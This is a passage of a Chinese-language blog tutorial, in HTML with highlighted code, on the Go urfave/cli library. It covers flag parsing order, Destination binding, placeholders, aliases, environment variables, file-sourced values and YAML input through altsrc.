punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Msg</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"run error\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 参数在前 flag 在后，没有识别 flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$go</span> run main.go  fff <span class=\"token parameter variable\">--lang</span> spanish</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"level\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"info\"</span>,<span class=\"token string\">\"time\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"2023-11-12T06:31:34Z\"</span>,<span class=\"token string\">\"message\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Hello fff</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#flag 在前，，参数在后 正常识别</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$go</span> run main.go <span class=\"token parameter variable\">--lang</span> spanish fff</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"level\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"info\"</span>,<span class=\"token string\">\"time\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"2023-11-12T06:32:20Z\"</span>,<span class=\"token string\">\"message\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Hola fff</pre></td></tr></table></figure><h2 id=\"获取选项的值\"><a class=\"anchor\" href=\"#获取选项的值\">#</a> 获取选项的值</h2>\n<p>获取 flag 可以通过  <code>ctx.Type(name)</code>  也可以绑定  <code>Destination</code>  字段</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">var</span> language <span class=\"token builtin\">string</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  app <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>App<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    Flags<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>cli<span class=\"token punctuation\">.</span>Flag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>StringFlag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        Name<span class=\"token punctuation\">:</span>        <span class=\"token string\">\"lang\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        Value<span class=\"token punctuation\">:</span>       <span class=\"token string\">\"english\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        Usage<span class=\"token punctuation\">:</span>       <span class=\"token string\">\"language for the greeting\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>          <span class=\"token comment\">// 这的 Destination</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        Destination<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span>language<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    Action<span class=\"token punctuation\">:</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>cli<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      name <span class=\"token operator\">:=</span> <span class=\"token string\">\"world\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">NArg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        name <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">Args</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token keyword\">if</span> language <span class=\"token operator\">==</span> <span class=\"token string\">\"english\"</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"你好\"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    log<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"占位符\"><a class=\"anchor\" href=\"#占位符\">#</a> 占位符</h2>\n<p>可以在 <code>Usage</code>  字段中为选项设置占位值，占位值通过反引号 <strong>`</strong> 包围。只有第一个生效，其他的维持不变。占位值有助于生成易于理解的帮助信息：</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  app <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span> cli<span class=\"token punctuation\">.</span>App<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Flags <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>cli<span class=\"token punctuation\">.</span>Flag <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>StringFlag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        Name<span class=\"token punctuation\">:</span><span class=\"token string\">\"config\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        Usage<span class=\"token punctuation\">:</span> <span class=\"token string\">\"Load configuration from `FILE`\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    log<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># GLOBAL OPTIONS 里 value 变成了 FILE</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$go</span> run main.go <span class=\"token parameter variable\">--help</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>NAME:</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   placeholder - A new cli application</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>USAGE:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   placeholder <span class=\"token punctuation\">[</span>global options<span class=\"token punctuation\">]</span> <span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">[</span>command options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>arguments<span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>COMMANDS:</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   help, h  Shows a list of commands or <span class=\"token builtin class-name\">help</span> <span class=\"token keyword\">for</span> one <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>GLOBAL OPTIONS:</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token parameter variable\">--config</span>    Load configuration from FILE</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   --help, <span class=\"token parameter variable\">-h</span>     show <span class=\"token builtin class-name\">help</span> <span class=\"token punctuation\">(</span>default: <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"别名\"><a class=\"anchor\" href=\"#别名\">#</a> 别名</h2>\n<p>flag 可以设置多个别名，设置对应选项的 <code>Aliases</code>  字段即可：</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    app <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>App<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        Flags<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>cli<span class=\"token punctuation\">.</span>Flag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>StringFlag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                Name<span class=\"token punctuation\">:</span>    <span class=\"token string\">\"lang\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                Aliases<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"l\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                Value<span class=\"token punctuation\">:</span>   <span class=\"token string\">\"english\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                Usage<span class=\"token punctuation\">:</span>   <span class=\"token string\">\"language for the greeting\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        log<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># GLOBAL OPTIONS 里显示，可以使用 --lang 和 - l 去设置 flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 通过两个效果一样的名称指定同一个选项会报错</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$go</span> run main.go <span class=\"token parameter variable\">-h</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>NAME:</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   main - A new cli application</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>USAGE:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   main <span class=\"token punctuation\">[</span>global options<span class=\"token punctuation\">]</span> <span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">[</span>command options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>arguments<span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>COMMANDS:</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   help, h  Shows a list of commands or <span class=\"token builtin class-name\">help</span> <span class=\"token keyword\">for</span> one <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>GLOBAL OPTIONS:</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token parameter variable\">--lang</span> value, <span class=\"token parameter variable\">-l</span> value  language <span class=\"token keyword\">for</span> the greeting <span class=\"token punctuation\">(</span>default: <span class=\"token string\">\"english\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   --help, <span class=\"token parameter variable\">-h</span>              show <span class=\"token builtin class-name\">help</span></pre></td></tr></table></figure><h2 id=\"环境变量\"><a class=\"anchor\" href=\"#环境变量\">#</a> 环境变量</h2>\n<p>读取指定的环境变量作为选项的值。只需要将环境变量的名字设置到选项对象的 <code>EnvVars</code>  字段即可。可以指定多个环境变量名字， <code>cli</code>  会依次查找，第一个有值的环境变量会被使用。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    app <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>App<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        Flags<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>cli<span class=\"token punctuation\">.</span>Flag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>StringFlag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                Name<span class=\"token punctuation\">:</span>    <span class=\"token string\">\"lang\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                Aliases<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"l\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                Value<span class=\"token punctuation\">:</span>   <span class=\"token string\">\"english\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                Usage<span class=\"token punctuation\">:</span>   <span class=\"token string\">\"language for the greeting\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                EnvVars<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"LEGACY_COMPAT_LANG\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"APP_LANG\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"LANG\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        log<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"文件变量\"><a class=\"anchor\" href=\"#文件变量\">#</a> 文件变量</h2>\n<p>可以从文件中获取变量，从文件中获取变量的优先级大于环境变量</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    app <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>App<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        Flags<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>cli<span class=\"token punctuation\">.</span>Flag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>StringFlag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                Name<span class=\"token punctuation\">:</span>     <span class=\"token string\">\"password\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                Aliases<span class=\"token punctuation\">:</span>  <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"p\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                Usage<span class=\"token punctuation\">:</span>    <span class=\"token string\">\"password for the mysql database\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                FilePath<span class=\"token punctuation\">:</span> <span class=\"token string\">\"/etc/mysql/password\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> app<span class=\"token punctuation\">.</span><span class=\"token function\">Run</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        log<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>支持从 YAML、JSON、TOML 中获取变量</p>\n<p>官网：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbGkudXJmYXZlLm9yZy92Mi9leGFtcGxlcy9mbGFncy8jdmFsdWVzLWZyb20tYWx0ZXJuYXRlLWlucHV0LXNvdXJjZXMteWFtbC10b21sLWFuZC1vdGhlcnM=\">https://cli.urfave.org/v2/examples/flags/#values-from-alternate-input-sources-yaml-toml-and-others</span></p>\n<p>参考资料：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3VyZmF2ZS9jbGkvaXNzdWVzLzEyNTA=\">https://github.com/urfave/cli/issues/1250</span></p>\n<p>这块查阅资料后发现有一系列的坑，官网以及国内的各个博客都没有做出很好的解释</p>\n<figure class=\"highlight yaml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key atrule\">test2</span><span class=\"token punctuation\">:</span> TTAA</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token key atrule\">test</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1234</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token key atrule\">key</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token key atrule\">child-key</span><span class=\"token punctuation\">:</span> value</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token key atrule\">child-key2</span><span class=\"token punctuation\">:</span> value2</pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tflags <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>cli<span class=\"token punctuation\">.</span>Flag<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\taltsrc<span class=\"token punctuation\">.</span><span class=\"token function\">NewIntFlag</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>IntFlag<span class=\"token punctuation\">&#123;</span>Name<span class=\"token punctuation\">:</span> <span class=\"token string\">\"test\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\taltsrc<span class=\"token punctuation\">.</span><span class=\"token function\">NewStringFlag</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>StringFlag<span class=\"token punctuation\">&#123;</span>Name<span class=\"token punctuation\">:</span> <span class=\"token string\">\"test2\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\taltsrc<span class=\"token punctuation\">.</span><span class=\"token function\">NewStringFlag</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>StringFlag<span class=\"token punctuation\">&#123;</span>Name<span class=\"token punctuation\">:</span> <span class=\"token string\">\"child-key2\"</span><span class=\"token punctuation\">,</span> Aliases<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"key.child-key2\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>StringFlag<span class=\"token punctuation\">&#123;</span>Name<span class=\"token punctuation\">:</span> <span class=\"token string\">\"load\"</span><span class=\"token punctuation\">,</span> Value<span class=\"token punctuation\">:</span> <span class=\"token string\">\"yaml.yaml\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tapp <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>cli<span class=\"token punctuation\">.</span>App<span class=\"token 